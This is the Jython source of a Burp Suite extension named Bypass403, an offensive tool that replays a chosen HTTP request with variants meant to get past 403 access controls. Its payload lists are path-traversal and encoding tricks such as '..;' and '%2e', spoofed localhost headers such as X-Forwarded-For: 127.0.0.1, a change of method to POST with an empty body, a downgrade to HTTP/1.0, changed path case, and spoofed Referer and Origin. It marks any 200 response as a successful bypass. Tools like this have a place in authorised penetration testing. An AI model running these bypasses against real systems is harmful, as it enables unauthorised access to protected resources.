from burp import IBurpExtender, IScanIssue, IScannerCheck, IContextMenuFactory, IContextMenuInvocation, ITab, IMessageEditorController
from javax.swing import JMenuItem, JPanel, JButton, JList, JTable, table, JLabel, JScrollPane, JTextField, WindowConstants, JFrame, JSplitPane, JTabbedPane, SwingUtilities
from javax.swing.table import DefaultTableCellRenderer
from java.awt import BorderLayout, GridLayout, Dimension, Color
from java.lang import Runnable, Integer
import java.util.ArrayList as ArrayList
import java.lang.String as String
from java.lang import Short
import thread
import sys

QUERY_PAYLOADS = [
	"%09",
	"%20",
	"%23",
	"%2e",
	"%2f",
	".",
	";",
	"..;",
	";%09",
	";%09..",
	";%09..;",
	";%2f..",
	"*",
 	"0x85",
	".abcxyz"
]

HEADER_PAYLOADS = [
	"Client-IP: 127.0.0.1",
	"X-Real-Ip: 127.0.0.1",
	"Redirect: 127.0.0.1",
	"Referer: 127.0.0.1",
	"X-Client-IP: 127.0.0.1",
	"X-Custom-IP-Authorization: 127.0.0.1",
	"X-Forwarded-By: 127.0.0.1",
	"X-Forwarded-For: 127.0.0.1",
	"X-Forwarded-Host: 127.0.0.1",
	"X-Forwarded-Port: 80",
	"X-True-IP: 127.0.0.1",
	"X-Internal-Request: true",
	"X-Forwarded-Proto: https"
]

extentionName = "Bypass403"

class StatusColorRenderer(DefaultTableCellRenderer):
	def __init__(self, status_column_index):
		DefaultTableCellRenderer.__init__(self)
		self.status_column_index = status_column_index

	def getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column):
		cell = DefaultTableCellRenderer.getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column)
		statusCode = table.getValueAt(row, self.status_column_index)
		if statusCode == "200":
			if isSelected:
				cell.setBackground(Color(0, 120, 0))
				cell.setForeground(Color.WHITE)
			else:
				cell.setBackground(Color(200, 255, 200))
				cell.setForeground(Color.BLACK)
		else:
			if isSelected:
				cell.setBackground(table.getSelectionBackground())
				cell.setForeground(table.getSelectionForeground())
			else:
				cell.setBackground(table.getBackground())
				cell.setForeground(table.getForeground())
		return cell

class NumericTableModel(table.DefaultTableModel):
	def __init__(self, data, columns):
		table.DefaultTableModel.__init__(self, data, columns)

	def getColumnClass(self, columnIndex):
		if columnIndex == 0:
			return Integer
		return String

class uiTab(JFrame, IMessageEditorController):
	def queryAddButtonClicked(self, event):
		textFieldValue = self.queryPayloadsAddPayloadTextField.getText()
		if textFieldValue != "":
			tableModel = self.queryPayloadsTable.getModel()
			tableModel.addRow([textFieldValue])
		self.queryPayloadsAddPayloadTextField.setText("")

	def queryClearButtonClicked(self, event):
		tableModel = self.queryPayloadsTable.getModel()
		tableModel.setRowCount(0)

	def queryRemoveButtonClicked(self, event):
		tableModel = self.queryPayloadsTable.getModel()
		selectedRows = self.queryPayloadsTable.getSelectedRows()
		for row in reversed(selectedRows):
			tableModel.removeRow(row)

	def headerAddButtonClicked(self, event):
		textFieldValue = self.headerPayloadsAddPayloadTextField.getText()
		if textFieldValue != "":
			tableModel = self.headerPayloadsTable.getModel()
			tableModel.addRow([textFieldValue])
		self.headerPayloadsAddPayloadTextField.setText("")

	def headerClearButtonClicked(self, event):
		tableModel = self.headerPayloadsTable.getModel()
		tableModel.setRowCount(0)

	def headerRemoveButtonClicked(self, event):
		tableModel = self.headerPayloadsTable.getModel()
		selectedRows = self.headerPayloadsTable.getSelectedRows()
		for row in reversed(selectedRows):
			tableModel.removeRow(row)

	def clearResultsButtonClicked(self, event):
		self.resultsTable.setRowSorter(None)
		self.resultsTableModel.setRowCount(0)
		self.resultsData = []
		self.currentlySelectedMessage = None
		self.requestViewer.setMessage([], True)
		self.responseViewer.setMessage([], False)
		self.resultsTable.setAutoCreateRowSorter(True)

	def __init__(self, callbacks):
		self.callbacks = callbacks
		self.helpers = callbacks.getHelpers()
		self.currentlySelectedMessage = None
		self.resultsData = []

		self.queryPayloadsLabel = JLabel("Query Payloads")
		self.jScrollPane1 = JScrollPane()
		self.queryPayloadsTable = JTable()
		self.queryPayloadsAddPayloadTextField = JTextField()
		self.queryPayloadsAddButton = JButton("Add", actionPerformed=self.queryAddButtonClicked)
		self.queryPayloadsClearButton = JButton("Clear", actionPerformed=self.queryClearButtonClicked)
		self.queryPayloadsRemoveButton = JButton("Remove", actionPerformed=self.queryRemoveButtonClicked)

		self.headerPayloadsLabel = JLabel("Header Payloads")
		self.jScrollPane2 = JScrollPane()
		self.headerPayloadsTable = JTable()
		self.headerPayloadsAddPayloadTextField = JTextField()
		self.headerPayloadsAddButton = JButton("Add", actionPerformed=self.headerAddButtonClicked)
		self.headerPayloadsClearButton = JButton("Clear", actionPerformed=self.headerClearButtonClicked)
		self.headerPayloadsRemoveButton = JButton("Remove", actionPerformed=self.headerRemoveButtonClicked)

		queryTableData = []
		for queryPayload in QUERY_PAYLOADS:
			queryTableData.append([queryPayload])

		headerTableData = []
		for headerPayload in HEADER_PAYLOADS:
			headerTableData.append([headerPayload])

		queryTableColumns = [None]
		queryTableModel = table.DefaultTableModel(queryTableData, queryTableColumns)
		self.queryPayloadsTable.setModel(queryTableModel)
		self.queryPayloadsTable.getTableHeader().setUI(None)
		self.jScrollPane1.setViewportView(self.queryPayloadsTable)

		headerTableColumns = [None]
		headerTableModel = table.DefaultTableModel(headerTableData, headerTableColumns)
		self.headerPayloadsTable.setModel(headerTableModel)
		self.headerPayloadsTable.getTableHeader().setUI(None)
		self.jScrollPane2.setViewportView(self.headerPayloadsTable)

		# Layout for Query Payloads Panel
		queryPanel = JPanel(BorderLayout())
		queryLabelPanel = JPanel(BorderLayout())
		queryLabelPanel.add(self.queryPayloadsLabel, BorderLayout.WEST)
		queryPanel.add(queryLabelPanel, BorderLayout.NORTH)
		queryPanel.add(self.jScrollPane1, BorderLayout.CENTER)
		
		queryButtonPanel = JPanel()
		queryButtonPanel.add(self.queryPayloadsAddButton)
		queryButtonPanel.add(self.queryPayloadsRemoveButton)
		queryButtonPanel.add(self.queryPayloadsClearButton)
		
		queryInputPanel = JPanel(BorderLayout())
		queryInputPanel.add(self.queryPayloadsAddPayloadTextField, BorderLayout.CENTER)
		queryInputPanel.add(queryButtonPanel, BorderLayout.EAST)
		queryPanel.add(queryInputPanel, BorderLayout.SOUTH)

		# Layout for Header Payloads Panel
		headerPanel = JPanel(BorderLayout())
		headerLabelPanel = JPanel(BorderLayout())
		headerLabelPanel.add(self.headerPayloadsLabel, BorderLayout.WEST)
		headerPanel.add(headerLabelPanel, BorderLayout.NORTH)
		headerPanel.add(self.jScrollPane2, BorderLayout.CENTER)
		
		headerButtonPanel = JPanel()
		headerButtonPanel.add(self.headerPayloadsAddButton)
		headerButtonPanel.add(self.headerPayloadsRemoveButton)
		headerButtonPanel.add(self.headerPayloadsClearButton)
		
		headerInputPanel = JPanel(BorderLayout())
		headerInputPanel.add(self.headerPayloadsAddPayloadTextField, BorderLayout.CENTER)
		headerInputPanel.add(headerButtonPanel, BorderLayout.EAST)
		headerPanel.add(headerInputPanel, BorderLayout.SOUTH)

		# Configuration container
		configPanel = JPanel(GridLayout(1, 2, 20, 0))
		configPanel.add(queryPanel)
		configPanel.add(headerPanel)
		configPanel.setPreferredSize(Dimension(1000, 220))

		# Message Viewers
		self.requestViewer = callbacks.createMessageEditor(self, False)
		self.responseViewer = callbacks.createMessageEditor(self, False)

		# Results JTable
		self.resultsTable = JTable()
		resultsTableColumns = ["#", "Method", "Path", "Payload / Type", "Status Code", "Length"]
		self.resultsTableModel = NumericTableModel([], resultsTableColumns)
		self.resultsTable.setModel(self.resultsTableModel)
		self.resultsTable.setAutoCreateRowSorter(True)
		self.resultsTable.getSelectionModel().addListSelectionListener(self.rowSelected)

		# Add Table Cell Renderer for highlighting (4 is status code column)
		renderer = StatusColorRenderer(4)
		for i in range(self.resultsTable.getColumnCount()):
			self.resultsTable.getColumnModel().getColumn(i).setCellRenderer(renderer)

		resultsScrollPane = JScrollPane(self.resultsTable)
		resultsScrollPane.setPreferredSize(Dimension(1000, 200))

		# Panel for Results Header & Clear Button
		resultsHeaderPanel = JPanel(BorderLayout())
		resultsHeaderPanel.add(JLabel("Test Results"), BorderLayout.WEST)
		self.clearResultsButton = JButton("Clear Table", actionPerformed=self.clearResultsButtonClicked)
		resultsHeaderPanel.add(self.clearResultsButton, BorderLayout.EAST)

		resultsPanelContainer = JPanel(BorderLayout())
		resultsPanelContainer.add(resultsHeaderPanel, BorderLayout.NORTH)
		resultsPanelContainer.add(resultsScrollPane, BorderLayout.CENTER)

		# Horizontal Split for Request/Response Viewers
		self.requestResponseSplit = JSplitPane(JSplitPane.HORIZONTAL_SPLIT, self.requestViewer.getComponent(), self.responseViewer.getComponent())
		self.requestResponseSplit.setResizeWeight(0.5)

		# Split Pane to show table on top, request/response editors on bottom
		resultsSplitPane = JSplitPane(JSplitPane.VERTICAL_SPLIT, resultsPanelContainer, self.requestResponseSplit)
		resultsSplitPane.setDividerLocation(180)

		# Main Tab Panel
		self.panel = JPanel(BorderLayout())
		self.panel.add(configPanel, BorderLayout.NORTH)
		self.panel.add(resultsSplitPane, BorderLayout.CENTER)

	# IMessageEditorController implementation
	def getHttpService(self):
		if self.currentlySelectedMessage:
			return self.currentlySelectedMessage.getHttpService()
		return None

	def getRequest(self):
		if self.currentlySelectedMessage:
			return self.currentlySelectedMessage.getRequest()
		return None

	def getResponse(self):
		if self.currentlySelectedMessage:
			return self.currentlySelectedMessage.getResponse()
		return None

	def rowSelected(self, event):
		if not event.getValueIsAdjusting():
			row = self.resultsTable.getSelectedRow()
			if row >= 0:
				modelRow = self.resultsTable.convertRowIndexToModel(row)
				if modelRow >= 0 and modelRow < len(self.resultsData):
					self.currentlySelectedMessage = self.resultsData[modelRow]
					self.requestViewer.setMessage(self.currentlySelectedMessage.getRequest(), True)
					if self.currentlySelectedMessage.getResponse() is not None:
						self.responseViewer.setMessage(self.currentlySelectedMessage.getResponse(), False)
					else:
						self.responseViewer.setMessage([], False)

class BurpExtender(IBurpExtender, IScannerCheck, IContextMenuFactory, ITab):
	def registerExtenderCallbacks(self, callbacks):
		self.callbacks = callbacks
		self.helpers = self.callbacks.getHelpers()
		self.callbacks.registerScannerCheck(self)
		self.callbacks.registerContextMenuFactory(self)
		self.callbacks.setExtensionName(extentionName)
		self.callbacks.addSuiteTab(self)

		sys.stdout = self.callbacks.getStdout()
		sys.stderr = self.callbacks.getStderr()
		return None

	def getTabCaption(self):
		return extentionName

	def getUiComponent(self):
		self.frm = uiTab(self.callbacks)
		return self.frm.panel

	def createMenuItems(self, invocation):
		self.context = invocation
		self.menuList = []
		self.menuItem = JMenuItem("Bypass 403", actionPerformed=self.testFromMenu)
		self.menuList.append(self.menuItem)
		return self.menuList

	def testFromMenu(self, event):
		selectedMessages = self.context.getSelectedMessages()
		for message in selectedMessages:
			thread.start_new_thread(self.doActiveScan, (message, None, True))
		return None

	def doPassiveScan(self, baseRequestResponse):
		return None

	def doActiveScan(self, baseRequestResponse, insertionPoint=None, isCalledFromMenu=False):
		if not isCalledFromMenu:
			return None
		self.clearResults()
		self.testRequest(baseRequestResponse)
		return None

	def clearResults(self):
		class TableClearer(Runnable):
			def __init__(self, tab):
				self.tab = tab
			def run(self):
				self.tab.resultsTable.setRowSorter(None)
				self.tab.resultsTableModel.setRowCount(0)
				self.tab.resultsData = []
				self.tab.currentlySelectedMessage = None
				self.tab.requestViewer.setMessage([], True)
				self.tab.responseViewer.setMessage([], False)
				self.tab.resultsTable.setAutoCreateRowSorter(True)
		SwingUtilities.invokeLater(TableClearer(self.frm))

	def addResultToTable(self, method, url, payload_type, status_code, content_length, is_bypassed, httpMessage):
		class TableUpdater(Runnable):
			def __init__(self, tab, row_data, msg):
				self.tab = tab
				self.row_data = row_data
				self.msg = msg
			def run(self):
				row_id = self.tab.resultsTableModel.getRowCount() + 1
				self.tab.resultsTableModel.addRow([
					row_id,
					self.row_data[0],
					self.row_data[1],
					self.row_data[2],
					self.row_data[3],
					self.row_data[4]
				])
				self.tab.resultsData.append(self.msg)
		SwingUtilities.invokeLater(TableUpdater(self.frm, [method, url, payload_type, status_code, content_length], httpMessage))

	def getContentLength(self, response, responseInfo):
		if response:
			return str(len(response))
		return "0"

	def findAllCharIndexesInString(self, s, ch):
		return [i for i, ltr in enumerate(s) if ltr == ch]

	def generatePayloads(self, path, payload):
		payloads = []
		# generate payloads before slash
		for i in self.findAllCharIndexesInString(path, "/"):
			pathWithPayload = path[:i] + payload + path[i:]
			payloads.append(pathWithPayload)
		# generate payloads after slash
		for i in self.findAllCharIndexesInString(path, "/"):
			pathWithPayload = path[:i] + "/" + payload + path[i+1:]
			payloads.append(pathWithPayload)
		# generate payloads in between slashes
		for i in self.findAllCharIndexesInString(path, "/"):
			pathWithPayload = path[:i] + "/" + payload + "/" + path[i+1:]
			payloads.append(pathWithPayload)
		# generate payloads at the end of the path
		payloads.append(path + "/" + payload)
		payloads.append(path + "/" + payload + "/")
		return payloads

	def scanQueryPayloads(self, baseRequestResponse, queryPayloadsFromTable, httpService):
		requestInfo = self.helpers.analyzeRequest(baseRequestResponse)
		requestPath = baseRequestResponse.getUrl().getPath()
		originalHeaders = list(requestInfo.getHeaders())
		requestBody = baseRequestResponse.getRequest()[requestInfo.getBodyOffset():]
		method = requestInfo.getMethod()
		
		for payload in queryPayloadsFromTable:
			payload = payload.rstrip('\n')
			payloads = self.generatePayloads(requestPath, payload)
			for pathToTest in payloads:
				headers = list(originalHeaders)
				if len(headers) > 0:
					requestLineParts = headers[0].split(" ")
					if len(requestLineParts) >= 2:
						originalPathWithQuery = requestLineParts[1]
						newPathWithQuery = originalPathWithQuery.replace(requestPath, pathToTest, 1)
						requestLineParts[1] = newPathWithQuery
						headers[0] = " ".join(requestLineParts)
				
				headersAsJavaSublist = ArrayList()
				for h in headers:
					headersAsJavaSublist.add(String(h))
				
				try:
					newRequest = self.helpers.buildHttpMessage(headersAsJavaSublist, requestBody)
					newRequestResult = self.callbacks.makeHttpRequest(httpService, newRequest)
					response = newRequestResult.getResponse()
					if response:
						responseInfo = self.helpers.analyzeResponse(response)
						statusCode = str(responseInfo.getStatusCode())
						contentLength = self.getContentLength(response, responseInfo)
					else:
						statusCode = "No response"
						contentLength = "0"
				except Exception as e:
					print("Error making query payload request: " + str(e))
					continue
				
				is_bypassed = (statusCode == "200")
				self.addResultToTable(method, pathToTest, "Query: " + payload, statusCode, contentLength, is_bypassed, newRequestResult)

	def scanHeaderPayloads(self, baseRequestResponse, headerPayloadsFromTable, httpService):
		requestInfo = self.helpers.analyzeRequest(baseRequestResponse)
		originalHeaders = list(requestInfo.getHeaders())
		requestBody = baseRequestResponse.getRequest()[requestInfo.getBodyOffset():]
		method = requestInfo.getMethod()
		url = str(baseRequestResponse.getUrl())
		
		for payload in headerPayloadsFromTable:
			payload = payload.rstrip('\n')
			headers = list(originalHeaders)
			headerAlreadyAdded = False
			
			payloadKey = payload.split(":", 1)[0].strip().lower() if ":" in payload else payload.strip().lower()
			
			for index, header in enumerate(headers):
				headerKey = header.split(":", 1)[0].strip().lower() if ":" in header else header.strip().lower()
				if headerKey == payloadKey:
					headers[index] = payload
					headerAlreadyAdded = True
					break
			
			if not headerAlreadyAdded:
				headers.append(payload)
				
			headersAsJavaSublist = ArrayList()
			for h in headers:
				headersAsJavaSublist.add(String(h))
				
			try:
				newRequest = self.helpers.buildHttpMessage(headersAsJavaSublist, requestBody)
				newRequestResult = self.callbacks.makeHttpRequest(httpService, newRequest)
				response = newRequestResult.getResponse()
				if response:
					responseInfo = self.helpers.analyzeResponse(response)
					statusCode = str(responseInfo.getStatusCode())
					contentLength = self.getContentLength(response, responseInfo)
				else:
					statusCode = "No response"
					contentLength = "0"
			except Exception as e:
				print("Error making header payload request: " + str(e))
				continue
				
			is_bypassed = (statusCode == "200")
			self.addResultToTable(method, requestInfo.getUrl().getPath(), "Header: " + payload, statusCode, contentLength, is_bypassed, newRequestResult)

	def scanPostAndEmptyCL(self, baseRequestResponse, httpService):
		requestInfo = self.helpers.analyzeRequest(baseRequestResponse)
		headers = list(requestInfo.getHeaders())
		if len(headers) > 0 and headers[0].startswith("GET"):
			headers[0] = headers[0].replace("GET", "POST")
			headers.append("Content-Length: 0")
			
			headersAsJavaSublist = ArrayList()
			for h in headers:
				headersAsJavaSublist.add(String(h))
				
			requestBody = baseRequestResponse.getRequest()[requestInfo.getBodyOffset():]
			
			try:
				newRequest = self.helpers.buildHttpMessage(headersAsJavaSublist, requestBody)
				newRequestResult = self.callbacks.makeHttpRequest(httpService, newRequest)
				response = newRequestResult.getResponse()
				if response:
					responseInfo = self.helpers.analyzeResponse(response)
					statusCode = str(responseInfo.getStatusCode())
					contentLength = self.getContentLength(response, responseInfo)
				else:
					statusCode = "No response"
					contentLength = "0"
			except Exception as e:
				print("Error making POST request: " + str(e))
				return
				
			is_bypassed = (statusCode == "200")
			self.addResultToTable("POST", requestInfo.getUrl().getPath(), "Method: POST & CL: 0", statusCode, contentLength, is_bypassed, newRequestResult)

	def scanDowngradedHttp(self, baseRequestResponse, httpService):
		requestInfo = self.helpers.analyzeRequest(baseRequestResponse)
		headers = list(requestInfo.getHeaders())
		if len(headers) > 0:
			newHeader = headers[0].replace("HTTP/1.1", "HTTP/1.0")
			headersAsJavaSublist = ArrayList()
			headersAsJavaSublist.add(String(newHeader))
			
			requestBody = baseRequestResponse.getRequest()[requestInfo.getBodyOffset():]
			
			try:
				newRequest = self.helpers.buildHttpMessage(headersAsJavaSublist, requestBody)
				newRequestResult = self.callbacks.makeHttpRequest(httpService, newRequest)
				response = newRequestResult.getResponse()
				if response:
					responseInfo = self.helpers.analyzeResponse(response)
					statusCode = str(responseInfo.getStatusCode())
					contentLength = self.getContentLength(response, responseInfo)
				else:
					statusCode = "No response"
					contentLength = "0"
			except Exception as e:
				print("Error making Downgraded HTTP request: " + str(e))
				return
				
			is_bypassed = (statusCode == "200")
			self.addResultToTable(requestInfo.getMethod(), requestInfo.getUrl().getPath(), "Protocol: HTTP/1.0 & No Headers", statusCode, contentLength, is_bypassed, newRequestResult)

	def capitalize_first_letters(self, path):
		segments = path.split("/")
		capitalized = []
		for segment in segments:
			if segment:
				capitalized.append(segment[0].upper() + segment[1:])
			else:
				capitalized.append(segment)
		return "/".join(capitalized)

	def alternate_case(self, path):
		segments = path.split("/")
		alternated = []
		for segment in segments:
			if segment:
				alt_segment = ""
				for idx, char in enumerate(segment):
					if idx % 2 == 0:
						alt_segment += char.upper()
					else:
						alt_segment += char.lower()
				alternated.append(alt_segment)
			else:
				alternated.append(segment)
		return "/".join(alternated)

	def scanCaseSensitive(self, baseRequestResponse, httpService):
		requestPath = baseRequestResponse.getUrl().getPath()
		if not requestPath or requestPath == "/":
			return
			
		path_caps = self.capitalize_first_letters(requestPath)
		path_alt = self.alternate_case(requestPath)
		
		test_paths = []
		if path_caps != requestPath:
			test_paths.append((path_caps, "Case Sensitive: First Letter Capitalized"))
		if path_alt != requestPath and path_alt != path_caps:
			test_paths.append((path_alt, "Case Sensitive: Alternating Case"))
			
		requestInfo = self.helpers.analyzeRequest(baseRequestResponse)
		originalHeaders = list(requestInfo.getHeaders())
		requestBody = baseRequestResponse.getRequest()[requestInfo.getBodyOffset():]
		method = requestInfo.getMethod()
		
		for pathToTest, payload_type in test_paths:
			headers = list(originalHeaders)
			if len(headers) > 0:
				requestLineParts = headers[0].split(" ")
				if len(requestLineParts) >= 2:
					originalPathWithQuery = requestLineParts[1]
					newPathWithQuery = originalPathWithQuery.replace(requestPath, pathToTest, 1)
					requestLineParts[1] = newPathWithQuery
					headers[0] = " ".join(requestLineParts)
			
			headersAsJavaSublist = ArrayList()
			for h in headers:
				headersAsJavaSublist.add(String(h))
				
			try:
				newRequest = self.helpers.buildHttpMessage(headersAsJavaSublist, requestBody)
				newRequestResult = self.callbacks.makeHttpRequest(httpService, newRequest)
				response = newRequestResult.getResponse()
				if response:
					responseInfo = self.helpers.analyzeResponse(response)
					statusCode = str(responseInfo.getStatusCode())
					contentLength = self.getContentLength(response, responseInfo)
				else:
					statusCode = "No response"
					contentLength = "0"
			except Exception as e:
				print("Error making Case Sensitive request: " + str(e))
				continue
				
			is_bypassed = (statusCode == "200")
			self.addResultToTable(method, pathToTest, payload_type, statusCode, contentLength, is_bypassed, newRequestResult)

	def scanRefererAndOriginSpoofing(self, baseRequestResponse, httpService):
		requestInfo = self.helpers.analyzeRequest(baseRequestResponse)
		originalHeaders = list(requestInfo.getHeaders())
		requestBody = baseRequestResponse.getRequest()[requestInfo.getBodyOffset():]
		method = requestInfo.getMethod()
		url = str(baseRequestResponse.getUrl())
		
		# We want to test Spoofing Referer, Spoofing Origin, and both.
		# Construct the modifications.
		test_scenarios = [
			("Referer Spoofing", {"referer": "Referer: " + url}),
			("Origin Spoofing", {"origin": "Origin: " + url}),
			("Referer & Origin Spoofing", {"referer": "Referer: " + url, "origin": "Origin: " + url})
		]
		
		for scenario_name, headers_to_set in test_scenarios:
			headers = list(originalHeaders)
			
			# Tracks which of the targets were already in the header list
			modified_keys = set()
			
			for index, header in enumerate(headers):
				header_lower = header.lower()
				for key, new_val in headers_to_set.items():
					if header_lower.startswith(key + ":"):
						headers[index] = new_val
						modified_keys.add(key)
						
			# Add headers that weren't already present
			for key, new_val in headers_to_set.items():
				if key not in modified_keys:
					headers.append(new_val)
					
			headersAsJavaSublist = ArrayList()
			for h in headers:
				headersAsJavaSublist.add(String(h))
				
			try:
				newRequest = self.helpers.buildHttpMessage(headersAsJavaSublist, requestBody)
				newRequestResult = self.callbacks.makeHttpRequest(httpService, newRequest)
				response = newRequestResult.getResponse()
				if response:
					responseInfo = self.helpers.analyzeResponse(response)
					statusCode = str(responseInfo.getStatusCode())
					contentLength = self.getContentLength(response, responseInfo)
				else:
					statusCode = "No response"
					contentLength = "0"
			except Exception as e:
				print("Error making Spoofing request: " + str(e))
				continue
				
			is_bypassed = (statusCode == "200")
			self.addResultToTable(method, requestInfo.getUrl().getPath(), scenario_name, statusCode, contentLength, is_bypassed, newRequestResult)

	def testRequest(self, baseRequestResponse):
		httpService = baseRequestResponse.getHttpService()
		
		# Get payloads from tables
		queryPayloadsFromTable = []
		for rowIndex in range(self.frm.queryPayloadsTable.getRowCount()):
			queryPayloadsFromTable.append(str(self.frm.queryPayloadsTable.getValueAt(rowIndex, 0)))
			
		headerPayloadsFromTable = []
		for rowIndex in range(self.frm.headerPayloadsTable.getRowCount()):
			headerPayloadsFromTable.append(str(self.frm.headerPayloadsTable.getValueAt(rowIndex, 0)))
			
		# Run all test cases sequentially
		self.scanQueryPayloads(baseRequestResponse, queryPayloadsFromTable, httpService)
		self.scanHeaderPayloads(baseRequestResponse, headerPayloadsFromTable, httpService)
		self.scanPostAndEmptyCL(baseRequestResponse, httpService)
		self.scanDowngradedHttp(baseRequestResponse, httpService)
		self.scanCaseSensitive(baseRequestResponse, httpService)
		self.scanRefererAndOriginSpoofing(baseRequestResponse, httpService)
		return None

	def consolidateDuplicateIssues(self, existingIssue, newIssue):
		return 0
